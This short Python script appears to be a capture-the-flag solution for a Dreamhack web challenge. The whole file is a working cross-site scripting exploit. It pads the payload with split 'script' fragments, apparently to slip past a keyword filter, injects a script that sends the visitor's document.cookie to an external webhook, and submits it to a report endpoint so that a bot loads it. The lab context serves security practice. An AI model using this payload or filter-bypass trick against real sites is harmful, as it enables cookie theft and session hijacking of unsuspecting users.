import requests
from urllib.parse import quote

url = 'http://host3.dreamhack.games:8403/'
s = requests.session()

pad = ''

for i in range(100):
    p = 'script'
    n = len(p)

    pad = f'{p[:n // 2]}{pad}{p[n // 2:]}'

webhook = 'https://aepmxrf.request.dreamhack.games'
xss = '<Script>location.href=`%s?e=${document.cookie}`</Script>' % webhook
payload = f'lol{xss}{pad}'[:500]

res = s.post(f'{url}/report.php', data={
    'path': f'/?comment={quote(payload)}'
})

print("> Reported payload")